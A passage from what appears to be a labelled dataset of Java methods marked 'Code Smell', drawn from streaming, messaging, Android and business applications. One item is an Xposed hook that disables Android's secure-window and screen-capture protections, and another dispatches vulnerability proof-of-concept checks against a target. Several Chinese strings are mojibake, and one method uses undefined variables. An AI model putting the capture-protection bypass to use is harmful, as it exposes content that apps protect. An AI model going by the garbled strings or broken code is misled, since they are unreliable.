      splitState.asBinlogSplitState().setStartingOffset(position);
      reportPos(position);
      iSnapShot=false;
      updateMessageTimestamp(element);
    }
 else {
      if (splitState.isSnapshotSplitState()) {
        iSnapShot=true;
      }
      updateMessageTimestampSnap(element);
    }
    fetchDelay=System.currentTimeMillis() - messageTimestamp;
    reportMetrics(element);
    final Map<TableId,TableChange> tableSchemas=splitState.getMySQLSplit().getTableSchemas();
    final TableChange tableSchema=tableSchemas.getOrDefault(RecordUtils.getTableId(element),null);
    updateSnapshotRecord(element,splitState);
    TableChange newTableChange=ColumnFilterUtil.createTableChange(tableSchema,columnNameFilter);
    debeziumDeserializationSchema.deserialize(element,new Collector<T>(){
      @Override public void collect(      final T t){
        if (migrateAll) {
          Struct value=(Struct)element.value();
          Struct source=value.getStruct(Envelope.FieldName.SOURCE);
          String databaseName=source.getString(AbstractSourceInfo.DATABASE_NAME_KEY);
          String tableName=source.getString(AbstractSourceInfo.TABLE_NAME_KEY);
          sourceReaderMetrics.outputMetrics(databaseName,tableName,iSnapShot,t);
        }
 else {
          sourceReaderMetrics.outputMetrics(null,null,iSnapShot,t);
        }
        output.collect(t);
      }
      @Override public void close(){
      }
    }
,newTableChange);
  }
 else   if (isHeartbeatEvent(element)) {
    updateStartingOffsetForSplit(splitState,element);
  }
 else {
    LOG.info(""Meet unknown element {}, just skip."",element);
  }
}
",1,Code Smell
"private boolean getTopicDeployJsonSetInfo(HttpServletRequest req,boolean isAddOp,BaseEntity defOpEntity,StringBuilder sBuffer,ProcessResult result){
  if (!WebParameterUtils.getJsonArrayParamValue(req,WebFieldDef.TOPICJSONSET,true,null,result)) {
    return result.isSuccess();
  }
  List<Map<String,String>> deployJsonArray=(List<Map<String,String>>)result.getRetData();
  TopicDeployEntity itemConf;
  Map<String,TopicDeployEntity> addRecordMap=new HashMap<>();
  for (  Map<String,String> confMap : deployJsonArray) {
    if (!WebParameterUtils.getAUDBaseInfo(confMap,isAddOp,defOpEntity,sBuffer,result)) {
      return result.isSuccess();
    }
    final BaseEntity itemOpEntity=(BaseEntity)result.getRetData();
    if (!WebParameterUtils.getStringParamValue(confMap,WebFieldDef.TOPICNAME,true,"""",sBuffer,result)) {
      return result.isSuccess();
    }
    String topicName=(String)result.getRetData();
    if (!getBrokerConfInfo(confMap,sBuffer,result)) {
      return result.isSuccess();
    }
    BrokerConfEntity brokerConf=(BrokerConfEntity)result.getRetData();
    if (!WebParameterUtils.getTopicPropInfo(confMap,(isAddOp ? brokerConf.getTopicProps() : null),sBuffer,result)) {
      return result.isSuccess();
    }
    final TopicPropGroup topicPropInfo=(TopicPropGroup)result.getRetData();
    int topicNameId=TBaseConstants.META_VALUE_UNDEFINED;
    TopicCtrlEntity topicCtrlEntity=defMetaDataService.getTopicCtrlByTopicName(topicName);
    if (topicCtrlEntity != null) {
      topicNameId=topicCtrlEntity.getTopicId();
    }
    TopicStatus topicStatus=TopicStatus.STATUS_TOPIC_UNDEFINED;
    if (isAddOp) {
      topicStatus=TopicStatus.STATUS_TOPIC_OK;
    }
    itemConf=new TopicDeployEntity(itemOpEntity,brokerConf.getBrokerId(),topicName);
    itemConf.updModifyInfo(itemOpEntity.getDataVerId(),topicNameId,brokerConf.getBrokerPort(),brokerConf.getBrokerIp(),topicStatus,topicPropInfo);
    addRecordMap.put(itemConf.getRecordKey(),itemConf);
  }
  if (addRecordMap.isEmpty()) {
    result.setFailResult(sBuffer.append(""Not found record in "").append(WebFieldDef.TOPICJSONSET.name).append("" parameter!"").toString());
    sBuffer.delete(0,sBuffer.length());
    return result.isSuccess();
  }
  result.setSuccResult(addRecordMap);
  return result.isSuccess();
}",1,Code Smell
"@Override public boolean addFragmentToStack(BaseFragment fragment,int position){
  if (delegate != null && !delegate.needAddFragmentToStack(fragment,this) || !fragment.onFragmentCreate()) {
    return false;
  }
  if (fragmentsStack.contains(fragment)) {
    return false;
  }
  fragment.setParentLayout(this);
  if (position == -1 || position == INavigationLayout.FORCE_NOT_ATTACH_VIEW) {
    if (!fragmentsStack.isEmpty()) {
      BaseFragment previousFragment=fragmentsStack.get(fragmentsStack.size() - 1);
      previousFragment.onPause();
      if (previousFragment.actionBar != null && previousFragment.actionBar.shouldAddToContainer()) {
        ViewGroup parent=(ViewGroup)previousFragment.actionBar.getParent();
        if (parent != null) {
          parent.removeView(previousFragment.actionBar);
        }
      }
      if (previousFragment.fragmentView != null) {
        ViewGroup parent=(ViewGroup)previousFragment.fragmentView.getParent();
        if (parent != null) {
          previousFragment.onRemoveFromParent();
          parent.removeView(previousFragment.fragmentView);
        }
      }
      previousFragment.detachStoryViewer();
    }
    fragmentsStack.add(fragment);
    if (position != INavigationLayout.FORCE_NOT_ATTACH_VIEW) {
      attachView(fragment);
      fragment.onResume();
      fragment.onTransitionAnimationEnd(false,true);
      fragment.onTransitionAnimationEnd(true,true);
      fragment.onBecomeFullyVisible();
    }
    onFragmentStackChanged(""addFragmentToStack "" + position);
  }
 else {
    if (position == INavigationLayout.FORCE_ATTACH_VIEW_AS_FIRST) {
      position=0;
      attachViewTo(fragment,position);
    }
    fragmentsStack.add(position,fragment);
    onFragmentStackChanged(""addFragmentToStack"");
  }
  if (!useAlphaAnimations) {
    setVisibility(VISIBLE);
    if (backgroundView != null) {
      backgroundView.setVisibility(VISIBLE);
    }
  }
  return true;
}",1,Code Smell
"protected void handleLoadChartPattern(User currentUser,DashboardInfo dashboardInfo,HtmlTplDashboardWidgetEntity dashboardWidget,String[] chartWidgetIds,HtmlChartWidget[] chartWidgets,HtmlTplDashboardWidgetRenderer renderer,boolean loadChartForEditor) throws Throwable {
  LoadableChartWidgets lcws=null;
  if (loadChartForEditor) {
    if (Authorization.canEdit(dashboardWidget.getDataPermission()))     lcws=LoadableChartWidgets.all();
 else     lcws=LoadableChartWidgets.none();
  }
 else {
    lcws=dashboardInfo.getLoadableChartWidgets();
    if (lcws == null)     lcws=LoadableChartWidgets.permitted();
  }
  if (lcws.isPatternAll()) {
    ChartWidgetSourceContext.set(new ChartWidgetSourceContext(dashboardWidget.getCreateUser()));
  }
 else   if (lcws.isPatternNone()) {
    for (int i=0; i < chartWidgetIds.length; i++) {
      String chartWidgetId=chartWidgetIds[i];
      PermissionDeniedException e=new PermissionDeniedException(""Permission denied"");
      chartWidgets[i]=renderer.getHtmlChartWidgetForException(chartWidgetId,e);
    }
  }
 else   if (lcws.isPatternPermitted()) {
    ChartWidgetSourceContext.set(new ChartWidgetSourceContext(currentUser));
  }
 else   if (lcws.isPatternList()) {
    for (int i=0; i < chartWidgetIds.length; i++) {
      String chartWidgetId=chartWidgetIds[i];
      if (!lcws.inList(chartWidgetId)) {
        PermissionDeniedException e=new PermissionDeniedException(""Permission denied"");
        chartWidgets[i]=renderer.getHtmlChartWidgetForException(chartWidgetId,e);
      }
    }
    ChartWidgetSourceContext.set(new ChartWidgetSourceContext(dashboardWidget.getCreateUser()));
  }
 else {
    for (int i=0; i < chartWidgetIds.length; i++) {
      String chartWidgetId=chartWidgetIds[i];
      PermissionDeniedException e=new PermissionDeniedException(""Permission denied for unknown pattern '"" + lcws.getPattern() + ""'"");
      chartWidgets[i]=renderer.getHtmlChartWidgetForException(chartWidgetId,e);
    }
  }
}",1,Code Smell
"/** 
 * Extract or update native library into ""qa_dyn_lib"" dir
 * @param libraryName library name without ""lib"" or "".so"", eg. ""qauxv"", ""mmkv""
 */
static File extractNativeLibrary(Context ctx,String libraryName,String abi) throws IOError {
  String soName=""lib"" + libraryName + "".so.""+ BuildConfig.VERSION_CODE+ "".""+ abi;
  File dir=new File(ctx.getFilesDir(),""qa_dyn_lib"");
  if (!dir.isDirectory()) {
    if (dir.isFile()) {
      dir.delete();
    }
    dir.mkdir();
  }
  File soFile=new File(dir,soName);
  if (!soFile.exists()) {
    InputStream in=Natives.class.getClassLoader().getResourceAsStream(""lib/"" + abi + ""/lib""+ libraryName+ "".so"");
    if (in == null) {
      throw new UnsatisfiedLinkError(""Unsupported ABI: "" + abi);
    }
    for (    String name : dir.list()) {
      if (name.startsWith(""lib"" + libraryName + ""_"") || name.startsWith(""lib"" + libraryName + "".so"")) {
        new File(dir,name).delete();
      }
    }
    try {
      soFile.createNewFile();
      FileOutputStream fout=new FileOutputStream(soFile);
      byte[] buf=new byte[1024];
      int i;
      while ((i=in.read(buf)) > 0) {
        fout.write(buf,0,i);
      }
      in.close();
      fout.flush();
      fout.close();
    }
 catch (    IOException ioe) {
      try {
        in.close();
      }
 catch (      IOException ignored) {
      }
      throw new IOError(ioe);
    }
  }
  return soFile;
}",1,Code Smell
"/** 
 * Determine whether the underlying type has any unresolvable generics: either through an unresolvable type variable on the type itself or through implementing a generic interface in a raw fashion, i.e. without substituting that interface's type variables. The result will be  {@code true} only in those two scenarios.
 */
public boolean hasUnresolvableGenerics(){
  if (this == NONE) {
    return false;
  }
  ResolvableType[] generics=getGenerics();
  for (  ResolvableType generic : generics) {
    if (generic.isUnresolvableTypeVariable() || generic.isWildcardWithoutBounds()) {
      return true;
    }
  }
  Class<?> resolved=resolve();
  if (resolved != null) {
    for (    Type genericInterface : resolved.getGenericInterfaces()) {
      if (genericInterface instanceof Class) {
        if (forClass((Class<?>)genericInterface).hasGenerics()) {
          return true;
        }
      }
    }
    return getSuperType().hasUnresolvableGenerics();
  }
  return false;
}
",1,Code Smell
"private void processOpenVideo(final String videoPath,boolean muted,float start,float end,int compressQality){
  if (currentLoadingVideoRunnable != null) {
    Utilities.globalQueue.cancelRunnable(currentLoadingVideoRunnable);
    currentLoadingVideoRunnable=null;
  }
  videoTimelineView.setVideoPath(videoPath,start,end);
  videoPreviewMessageObject=null;
  muteVideo=muted || sendPhotoType == SELECT_TYPE_AVATAR;
  compressionsCount=-1;
  rotationValue=0;
  videoFramerate=25;
  File file=new File(videoPath);
  originalSize=file.length();
  Utilities.globalQueue.postRunnable(currentLoadingVideoRunnable=new Runnable(){
    @Override public void run(){
      if (currentLoadingVideoRunnable != this) {
        return;
      }
      int videoBitrate=MediaController.getVideoBitrate(videoPath);
      int[] params=new int[AnimatedFileDrawable.PARAM_NUM_COUNT];
      AnimatedFileDrawable.getVideoInfo(videoPath,params);
      if (currentLoadingVideoRunnable != this) {
        return;
      }
      Runnable thisFinal=this;
      AndroidUtilities.runOnUIThread(() -> {
        if (parentActivity == null || thisFinal != currentLoadingVideoRunnable) {
          return;
        }
        currentLoadingVideoRunnable=null;
        boolean hasAudio=params[AnimatedFileDrawable.PARAM_NUM_HAS_AUDIO] != 0;
        videoConvertSupported=params[AnimatedFileDrawable.PARAM_NUM_SUPPORTED_VIDEO_CODEC] != 0 && (!hasAudio || params[AnimatedFileDrawable.PARAM_NUM_SUPPORTED_AUDIO_CODEC] != 0);
        audioFramesSize=params[AnimatedFileDrawable.PARAM_NUM_AUDIO_FRAME_SIZE];
        videoDuration=params[AnimatedFileDrawable.PARAM_NUM_DURATION];
        if (videoBitrate == -1) {
          originalBitrate=bitrate=params[AnimatedFileDrawable.PARAM_NUM_BITRATE];
        }
 else {
          originalBitrate=bitrate=videoBitrate;
        }
        videoFramerate=params[AnimatedFileDrawable.PARAM_NUM_FRAMERATE];
        videoFramesSize=(long)(bitrate / 8 * videoDuration / 1000);
        if (videoConvertSupported) {
          rotationValue=params[AnimatedFileDrawable.PARAM_NUM_ROTATION];
          resultWidth=originalWidth=params[AnimatedFileDrawable.PARAM_NUM_WIDTH];
          resultHeight=originalHeight=params[AnimatedFileDrawable.PARAM_NUM_HEIGHT];
          updateCompressionsCount(originalWidth,originalHeight);
          if (compressQality == -1) {
            selectedCompression=selectCompression();
          }
 else {
            selectedCompression=compressQality;
          }
          updateWidthHeightBitrateForCompression();
          if (selectedCompression > compressionsCount - 1) {
            selectedCompression=compressionsCount - 1;
          }
          setCompressItemEnabled(compressionsCount > 1,true);
          if (BuildVars.LOGS_ENABLED) {
            FileLog.d(""compressionsCount = "" + compressionsCount + "" w = ""+ originalWidth+ "" h = ""+ originalHeight+ "" r = ""+ rotationValue);
          }
          if (Build.VERSION.SDK_INT < 18 && compressItem.getTag() != null) {
            videoConvertSupported=false;
            setCompressItemEnabled(false,true);
          }
          qualityChooseView.invalidate();
        }
 else {
          setCompressItemEnabled(false,true);
          compressionsCount=0;
        }
        updateVideoInfo();
        updateMuteButton();
      }
);
    }
  }
);
}",1,Code Smell
"@Override public void init(){
  if (lpparam.packageName.equals(""android"")) {
    try {
      Class<?> windowsState=XposedHelpers.findClass(""com.android.server.wm.WindowState"",lpparam.classLoader);
      Class<?> windowsManagerServiceImpl=XposedHelpers.findClassIfExists(""com.android.server.wm.WindowManagerServiceImpl"",lpparam.classLoader);
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
        XposedHelpers.findAndHookMethod(windowsState,""isSecureLocked"",XC_MethodReplacement.returnConstant(false));
      }
 else {
        XposedHelpers.findAndHookMethod(""com.android.server.wm.WindowManagerService"",lpparam.classLoader,""isSecureLocked"",windowsState,XC_MethodReplacement.returnConstant(false));
      }
      hookAllMethods(windowsManagerServiceImpl,""notAllowCaptureDisplay"",new MethodHook(){
        @Override protected void before(        MethodHookParam param) throws Throwable {
          param.setResult(false);
        }
      }
);
    }
 catch (    Throwable t) {
      logE(TAG,this.lpparam.packageName,t);
    }
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
      try {
        XposedHelpers.findAndHookMethod(""com.android.server.wm.ActivityTaskManagerService"",lpparam.classLoader,""registerScreenCaptureObserver"",""android.os.IBinder"",""android.app.IScreenCaptureObserver"",XC_MethodReplacement.DO_NOTHING);
      }
 catch (      Throwable t) {
        logE(TAG,this.lpparam.packageName,t);
      }
    }
    try {
      deoptimizeMethod(XposedHelpers.findClass(""com.android.server.wm.WindowStateAnimator"",lpparam.classLoader),""createSurfaceLocked"");
      var c=XposedHelpers.findClass(""com.android.server.display.DisplayManagerService"",lpparam.classLoader);
      deoptimizeMethod(c,""setUserPreferredModeForDisplayLocked"");
      deoptimizeMethod(c,""setUserPreferredDisplayModeInternal"");
      c=XposedHelpers.findClass(""com.android.server.wm.InsetsPolicy$InsetsPolicyAnimationControlListener"",lpparam.classLoader);
      for (      var m : c.getDeclaredConstructors()) {
        deoptimizeMethod.invoke(null,m);
      }
      c=XposedHelpers.findClass(""com.android.server.wm.InsetsPolicy"",lpparam.classLoader);
      deoptimizeMethod(c,""startAnimation"");
      deoptimizeMethod(c,""controlAnimationUnchecked"");
      for (int i=0; i < 20; i++) {
        c=XposedHelpers.findClassIfExists(""com.android.server.wm.DisplayContent$$ExternalSyntheticLambda"" + i,lpparam.classLoader);
        if (c != null && BiPredicate.class.isAssignableFrom(c)) {
          deoptimizeMethod(c,""test"");
        }
      }
      c=XposedHelpers.findClass(""com.android.server.wm.WindowManagerService"",lpparam.classLoader);
      deoptimizeMethod(c,""relayoutWindow"");
      for (int i=0; i < 20; i++) {
        c=XposedHelpers.findClassIfExists(""com.android.server.wm.RootWindowContainer$$ExternalSyntheticLambda"" + i,lpparam.classLoader);
        if (c != null && BiConsumer.class.isAssignableFrom(c)) {
          deoptimizeMethod(c,""accept"");
        }
      }
    }
 catch (    Throwable t) {
      logE(TAG,this.lpparam.packageName,t);
    }
  }
}",1,Code Smell
"public static void openURL(Context context,String accountID,String url,Object parentObject){
  String objectURL=null;
  if (parentObject instanceof Status) {
    objectURL=s.url;
  }
 else   if (parentObject instanceof Account) {
    objectURL=a.url;
  }
  Uri uri=Uri.parse(url);
  if (accountID != null && ""https"".equals(uri.getScheme()) && !Objects.equals(url,objectURL)) {
    List<String> path=uri.getPathSegments();
    if (AccountSessionManager.getInstance().getAccount(accountID).domain.equalsIgnoreCase(uri.getAuthority()) && path.size() == 2 && path.get(0).matches(""^@[a-zA-Z0-9_]+$"") && path.get(1).matches(""^[0-9]+$"")) {
      new GetStatusByID(path.get(1)).setCallback(new Callback<>(){
        @Override public void onSuccess(        Status result){
          Bundle args=new Bundle();
          args.putString(""account"",accountID);
          args.putParcelable(""status"",Parcels.wrap(result));
          Nav.go((Activity)context,ThreadFragment.class,args);
        }
        @Override public void onError(        ErrorResponse error){
          error.showToast(context);
          launchWebBrowser(context,url);
        }
      }
).wrapProgress((Activity)context,R.string.loading,true).exec(accountID);
      return;
    }
 else {
      new GetSearchResults(url,null,true,null,0,0).setCallback(new Callback<>(){
        @Override public void onSuccess(        SearchResults result){
          Bundle args=new Bundle();
          args.putString(""account"",accountID);
          if (result.statuses != null && !result.statuses.isEmpty()) {
            Status s=result.statuses.get(0);
            if (parentObject instanceof Status && s.id.equals(status.id)) {
              launchWebBrowser(context,url);
              return;
            }
            args.putParcelable(""status"",Parcels.wrap(s));
            Nav.go((Activity)context,ThreadFragment.class,args);
          }
 else           if (result.accounts != null && !result.accounts.isEmpty()) {
            Account a=result.accounts.get(0);
            if (parentObject instanceof Account && a.id.equals(account.id)) {
              launchWebBrowser(context,url);
              return;
            }
            args.putParcelable(""profileAccount"",Parcels.wrap(a));
            Nav.go((Activity)context,ProfileFragment.class,args);
          }
 else {
            launchWebBrowser(context,url);
          }
        }
        @Override public void onError(        ErrorResponse error){
          launchWebBrowser(context,url);
        }
      }
).wrapProgress((Activity)context,R.string.loading,true).exec(accountID);
      return;
    }
  }
  launchWebBrowser(context,url);
}",1,Code Smell
"public boolean syncDisplayMode(Window window,int videoWidth,float videoFramerate){
  return syncDisplayMode(window,videoWidth,videoFramerate,false);
}
/** 
 * Tries to find best suited display params for the video
 * @param window window object
 * @param videoWidth width of the video material
 * @param videoFramerate framerate of the video
 * @return
 */
public boolean syncDisplayMode(Window window,int videoWidth,float videoFramerate,boolean force){
  if (supportsDisplayModeChange() && videoWidth >= 10) {
    if (mUhdHelper == null) {
      mUhdHelper=new UhdHelper(mContext);
      mUhdHelper.registerModeChangeListener(this);
    }
    Mode[] modes=mUhdHelper.getSupportedModes();
    Log.d(TAG,""Modes supported by device:"");
    Log.d(TAG,Arrays.asList(modes));
    boolean needResolutionSwitch=false;
    List<Mode> resultModes=new ArrayList<>();
    if (mIsResolutionSwitchEnabled) {
      resultModes=filterModesByWidth(modes,Math.max(videoWidth,HD));
    }
    if (!resultModes.isEmpty()) {
      needResolutionSwitch=true;
    }
    Log.i(TAG,""Need resolution switch: "" + needResolutionSwitch);
    Mode currentMode=mUhdHelper.getCurrentMode();
    if (!needResolutionSwitch) {
      resultModes=filterSameResolutionModes(modes,currentMode);
    }
    boolean skipFps=mIsSkip24RateEnabled && videoFramerate >= 23.96 && videoFramerate <= 24.98 && currentMode != null;
    Mode closerMode=findCloserMode(resultModes,skipFps ? currentMode.getRefreshRate() : videoFramerate);
    if (closerMode == null) {
      String msg=""Could not find closer refresh rate for "" + videoFramerate + ""fps"";
      Log.i(TAG,msg);
      if (modes.length == 1) {
        mListener.onModeError(null);
      }
 else {
        mListener.onModeCancel();
      }
      return false;
    }
    Log.i(TAG,""Found closer mode: "" + closerMode + "" for fps ""+ videoFramerate);
    Log.i(TAG,""Current mode: "" + currentMode);
    if (!force && closerMode.equals(currentMode)) {
      Log.i(TAG,""Do not need to change mode."");
      mListener.onModeCancel();
      return false;
    }
    mNewMode=closerMode;
    mUhdHelper.setPreferredDisplayModeId(window,mNewMode.getModeId(),true);
    mDisplaySyncInProgress=true;
    if (mListener != null) {
      mListener.onModeStart(mNewMode);
    }
    return true;
  }
  return false;
}",1,Code Smell
"private static void sortOnParsing(Parsed parsed,List<BeanElement> elementList){
  List<BeanElement> tempList=new ArrayList<>();
  tempList.addAll(elementList);
  elementList.clear();
  BeanElement one=null;
  Iterator<BeanElement> ite=tempList.iterator();
  while (ite.hasNext()) {
    BeanElement be=ite.next();
    if (be.getProperty().equals(parsed.getKey())) {
      one=be;
      ite.remove();
    }
  }
  Iterator<BeanElement> beIte=tempList.iterator();
  while (beIte.hasNext()) {
    if (null == beIte.next()) {
      beIte.remove();
    }
  }
  if (one != null) {
    elementList.add(0,one);
  }
  for (  Field field : parsed.getClzz().getDeclaredFields()) {
    for (    BeanElement be : tempList) {
      if (be.getProperty().equals(field.getName())) {
        elementList.add(be);
      }
    }
  }
}",1,Code Smell
"@Transactional @Override public Long saveOrUpdate(ResultTemplateBO resultTemplateBO){
  Long operationUser=EmployeeHolder.getEmployeeId();
  if (ObjectUtil.isEmpty(operationUser)) {
    if (UserUtil.isAdmin()) {
      operationUser=0l;
    }
  }
  Date createTime=null;
  if (resultTemplateBO.getResultTemplateId() != null) {
    boolean exists=lambdaQuery().eq(HrmAchievementsResultTemplate::getResultTemplateName,resultTemplateBO.getResultTemplateName()).ne(HrmAchievementsResultTemplate::getResultTemplateId,resultTemplateBO.getResultTemplateId()).eq(HrmAchievementsResultTemplate::getStatus,AchievementsCommon.STATUS_TRUE).exists();
    if (exists) {
      throw new CrmException(HrmCodeEnum.TEMPLATE_SAVE_PARAM_ERROR,""缁撴灉妯℃澘鍚嶇О宸插瓨鍦�!"");
    }
    HrmAchievementsResultTemplate resultTemplate=lambdaQuery().select().eq(HrmAchievementsResultTemplate::getResultTemplateId,resultTemplateBO.getResultTemplateId()).eq(HrmAchievementsResultTemplate::getStatus,AchievementsCommon.STATUS_TRUE).one();
    lambdaUpdate().set(HrmAchievementsResultTemplate::getStatus,AchievementsCommon.STATUS_FALSE).eq(HrmAchievementsResultTemplate::getResultTemplateId,resultTemplate.getResultTemplateId()).update();
    resultTemplateBO.setResultTemplateId(null);
    resultTemplateBO.setCreateUserId(resultTemplate.getCreateUserId());
    createTime=resultTemplate.getCreateTime();
  }
 else {
    boolean exists=lambdaQuery().eq(HrmAchievementsResultTemplate::getResultTemplateName,resultTemplateBO.getResultTemplateName()).eq(HrmAchievementsResultTemplate::getStatus,AchievementsCommon.STATUS_TRUE).exists();
    if (exists) {
      throw new CrmException(HrmCodeEnum.TEMPLATE_SAVE_PARAM_ERROR,""缁撴灉妯℃澘鍚嶇О宸插瓨鍦�!"");
    }
  }
  checkResultTemplateParam(resultTemplateBO);
  HrmAchievementsResultTemplate resultTemplate=new HrmAchievementsResultTemplate();
  BeanUtil.copyProperties(resultTemplateBO,resultTemplate);
  if (resultTemplate.getCreateUserId() == null) {
    resultTemplate.setCreateUserId(operationUser);
  }
  resultTemplate.setUpdateUserId(operationUser);
  if (ObjectUtil.isNotNull(createTime)) {
    resultTemplate.setCreateTime(createTime);
  }
  resultTemplate.setStatus(AchievementsCommon.STATUS_TRUE);
  save(resultTemplate);
  AtomicReference<Integer> sort=new AtomicReference<>(1);
  List<String> levelSetting=new ArrayList<>();
  resultTemplateBO.getResultTemplateLevelBOList().stream().forEach(resultTemplateLevelBO -> {
    HrmAchievementsResultTemplateLevel resultTemplateLevel=new HrmAchievementsResultTemplateLevel();
    BeanUtil.copyProperties(resultTemplateLevelBO,resultTemplateLevel);
    resultTemplateLevel.setResultTemplateId(resultTemplate.getResultTemplateId());
    resultTemplateLevel.setCreateTime(new Date());
    resultTemplateLevel.setSort(sort.get());
    sort.getAndSet(sort.get() + 1);
    resultTemplateLevelService.save(resultTemplateLevel);
    levelSetting.add(resultTemplateLevelBO.getLevelName());
  }
);
  String levelSettingStr=levelSetting.stream().map(String::valueOf).collect(Collectors.joining("",""));
  lambdaUpdate().set(HrmAchievementsResultTemplate::getLevelSetting,levelSettingStr).eq(HrmAchievementsResultTemplate::getResultTemplateId,resultTemplate.getResultTemplateId()).update();
  return resultTemplate.getResultTemplateId();
}",1,Code Smell
"@Override public J visitBinary(Binary binary,PrintOutputCapture<P> p){
  String keyword="""";
switch (binary.getOperator()) {
case Addition:
    keyword=""+"";
  break;
case Subtraction:
keyword=""-"";
break;
case Multiplication:
keyword=""*"";
break;
case Division:
keyword=""/"";
break;
case Modulo:
keyword=""%"";
break;
case LessThan:
keyword=""<"";
break;
case GreaterThan:
keyword="">"";
break;
case LessThanOrEqual:
keyword=""<="";
break;
case GreaterThanOrEqual:
keyword="">="";
break;
case Equal:
keyword=""=="";
break;
case NotEqual:
keyword=""!="";
break;
case BitAnd:
keyword=""&"";
break;
case BitOr:
keyword=""|"";
break;
case BitXor:
keyword=""^"";
break;
case LeftShift:
keyword=""<<"";
break;
case RightShift:
keyword="">>"";
break;
case UnsignedRightShift:
keyword="">>>"";
break;
case Or:
keyword=""||"";
break;
case And:
keyword=""&&"";
break;
}
beforeSyntax(binary,Space.Location.BINARY_PREFIX,p);
visit(binary.getLeft(),p);
visitSpace(binary.getPadding().getOperator().getBefore(),Space.Location.BINARY_OPERATOR,p);
p.append(keyword);
visit(binary.getRight(),p);
afterSyntax(binary,p);
return binary;
}
",1,Code Smell
"public void GoPoc(String product) throws InvocationTargetException, IllegalAccessException, NullMethodArgsException, MalformedURLException {
  BasicController controller=Cache.routes.get(product);
  String target;
  if (this.args != null) {
    target=(String)args[0];
    String id=String.valueOf(Thread.currentThread().getId());
    String log_name=Cache.uiController.LogDirPath + File.separator + new URL(target).getHost().toString()+ ""_""+ Utils.getRandomString(4)+ ""_log.log"";
    Cache.ThreadIdForLog.put(id,log_name);
    System.out.println(""//->>寮�濮嬫壂鎻� "" + target);
  }
 else {
    target=Cache.uiController.targetAddress.getText();
    WriteLogBase(""//->>寮�濮嬫壂鎻� "" + Cache.uiController.SupportType.getValue() + ""鐨� 鎵�鏈塒OC\n"");
  }
  String VulName=Cache.uiController.SupportVul.getValue();
  String Vultype=Cache.uiController.SupportType.getValue();
  if (Vultype.equals(""Spring"")) {
    if (target.endsWith(""/"")) {
      target=target.substring(0,target.lastIndexOf(""/""));
    }
  }
 else {
    target=getUrl(target);
  }
  if (VulName.equals(""All"")) {
    List<Method> methodList=Cache.getVulRoutesValue(product);
    for (    Method method : methodList) {
      try {
        System.out.println(method.getName());
        method.invoke(controller,Poc_Exp.POC,target,args);
      }
 catch (      Exception e) {
        System.out.println(""invoke methos:"" + method.getName() + ""鏃跺嚭鐜伴敊璇�"");
      }
    }
  }
 else {
    List<Method> methodList=Cache.getVulRoutesValue(product);
    for (    Method method : methodList) {
      if (method.getName().equals(VulName)) {
        try {
          WriteLogBase(""\n[*]寮�濮嬫娴� "" + method.getName() + "":"");
          method.invoke(controller,Poc_Exp.POC,target,args);
          break;
        }
 catch (        Exception e) {
          System.out.println(""invoke methos:"" + method.getName() + ""鏃跺嚭鐜伴敊璇�"");
          Controller.WriteLog(""\n[*] invoke method:"" + method.getName() + ""鏃跺嚭鐜伴敊璇�"");
        }
      }
    }
  }
}",1,Code Smell
"private void updateSpoilersVisiblePart(int top,int bottom){
  if (hasCaptionLayout()) {
    float off=-captionY;
    for (    SpoilerEffect eff : captionSpoilers) {
      eff.setVisibleBounds(0,top + off,getWidth(),bottom + off);
    }
  }
  if (replyTextLayout != null) {
    float off=-replyStartY - replyTextLayout.getHeight();
    for (    SpoilerEffect eff : replySpoilers) {
      eff.setVisibleBounds(0,top + off,getWidth(),bottom + off);
    }
  }
  if (getMessageObject() != null && getMessageObject().textLayoutBlocks != null) {
    for (    MessageObject.TextLayoutBlock bl : getMessageObject().textLayoutBlocks) {
      for (      SpoilerEffect eff : bl.spoilers) {
        eff.setVisibleBounds(0,top - bl.textYOffset - textY,getWidth(),bottom - bl.textYOffset - textY);
      }
    }
  }
}",1,Code Smell
"@RequiresApi(api=Build.VERSION_CODES.M) static void handleFrameRate(final PlayerActivity activity,float frameRate,boolean play){
  activity.runOnUiThread(() -> {
    boolean switchingModes=false;
    if (BuildConfig.DEBUG)     Toast.makeText(activity,""Video frameRate: "" + frameRate,Toast.LENGTH_LONG).show();
    if (frameRate > 0) {
      Display display=activity.getWindow().getDecorView().getDisplay();
      if (display == null) {
        return;
      }
      Display.Mode[] supportedModes=display.getSupportedModes();
      Display.Mode activeMode=display.getMode();
      if (supportedModes.length > 1) {
        List<Display.Mode> modesHigh=new ArrayList<>();
        Display.Mode modeTop=activeMode;
        int modesResolutionCount=0;
        for (        Display.Mode mode : supportedModes) {
          if (mode.getPhysicalWidth() == activeMode.getPhysicalWidth() && mode.getPhysicalHeight() == activeMode.getPhysicalHeight()) {
            modesResolutionCount++;
            if (normRate(mode.getRefreshRate()) >= normRate(frameRate))             modesHigh.add(mode);
            if (normRate(mode.getRefreshRate()) > normRate(modeTop.getRefreshRate()))             modeTop=mode;
          }
        }
        if (modesResolutionCount > 1) {
          Display.Mode modeBest=null;
          String modes=""Available refreshRates:"";
          for (          Display.Mode mode : modesHigh) {
            modes+="" "" + mode.getRefreshRate();
            if (normRate(mode.getRefreshRate()) % normRate(frameRate) <= 0.0001f) {
              if (modeBest == null || normRate(mode.getRefreshRate()) > normRate(modeBest.getRefreshRate())) {
                modeBest=mode;
              }
            }
          }
          Window window=activity.getWindow();
          WindowManager.LayoutParams layoutParams=window.getAttributes();
          if (modeBest == null)           modeBest=modeTop;
          switchingModes=!(modeBest.getModeId() == activeMode.getModeId());
          if (switchingModes) {
            layoutParams.preferredDisplayModeId=modeBest.getModeId();
            window.setAttributes(layoutParams);
          }
          if (BuildConfig.DEBUG)           Toast.makeText(activity,modes + ""\n"" + ""Video frameRate: ""+ frameRate+ ""\n""+ ""Current display refreshRate: ""+ modeBest.getRefreshRate(),Toast.LENGTH_LONG).show();
        }
      }
    }
    if (!switchingModes) {
      playIfCan(activity,play);
    }
  }
);
}",1,Code Smell
"/** 
 * Save operation logs of all Controller
 */
public static Object doAround(ProceedingJoinPoint joinPoint,OperationLog operationLog) throws Throwable {
  RequestAttributes requestAttributes=RequestContextHolder.getRequestAttributes();
  if (requestAttributes == null) {
    return joinPoint.proceed();
  }
  HttpServletRequest request=((ServletRequestAttributes)requestAttributes).getRequest();
  UserInfo userInfo=Optional.ofNullable(LoginUserUtils.getLoginUser()).orElseGet(UserInfo::new);
  String operator=userInfo.getName();
  operator=StringUtils.isBlank(operator) ? ANONYMOUS_USER : operator;
